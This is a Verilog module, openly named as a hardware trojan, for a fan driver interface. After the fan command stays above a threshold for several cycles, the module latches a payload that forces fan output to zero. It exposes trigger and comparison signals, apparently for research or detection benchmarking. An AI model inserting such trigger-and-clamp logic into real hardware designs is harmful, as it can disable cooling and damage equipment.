`timescale 1ns/1ps

module fan_driver_interface_trojan #(
    parameter integer DATA_WIDTH = 16,
    parameter [DATA_WIDTH-1:0] TRIGGER_THRESHOLD = 16'd500,
    parameter [15:0] TRIGGER_CYCLES = 16'd8,
    parameter [DATA_WIDTH-1:0] PAYLOAD_CLAMP = 16'd0
) (
    input  wire                  clk,
    input  wire                  reset_n,
    input  wire [DATA_WIDTH-1:0] fan_command,
    output reg  [DATA_WIDTH-1:0] fan_actual,
    output reg                   trojan_triggered,
    output reg                   payload_active,
    output reg  [15:0]           trigger_counter,
    output reg  [DATA_WIDTH-1:0] clean_fan_command,
    output reg  [DATA_WIDTH-1:0] trojan_fan_actual
);
    wire threshold_met;
    wire trigger_now;

    assign threshold_met = fan_command >= TRIGGER_THRESHOLD;
    assign trigger_now =
        threshold_met &&
        !payload_active &&
        (trigger_counter >= (TRIGGER_CYCLES - 1'b1));

    always @(posedge clk or negedge reset_n) begin
        if (!reset_n) begin
            fan_actual          <= {DATA_WIDTH{1'b0}};
            trojan_triggered    <= 1'b0;
            payload_active      <= 1'b0;
            trigger_counter     <= 16'd0;
            clean_fan_command   <= {DATA_WIDTH{1'b0}};
            trojan_fan_actual   <= {DATA_WIDTH{1'b0}};
        end else begin
            clean_fan_command <= fan_command;

            if (!payload_active) begin
                if (threshold_met) begin
                    if (trigger_counter < TRIGGER_CYCLES)
                        trigger_counter <= trigger_counter + 1'b1;
                end else begin
                    trigger_counter <= 16'd0;
                end
            end

            if (trigger_now) begin
                trojan_triggered <= 1'b1;
                payload_active   <= 1'b1;
            end

            if (payload_active || trigger_now) begin
                fan_actual        <= PAYLOAD_CLAMP;
                trojan_fan_actual <= PAYLOAD_CLAMP;
            end else begin
                fan_actual        <= fan_command;
                trojan_fan_actual <= fan_command;
            end
        end
    end
endmodule
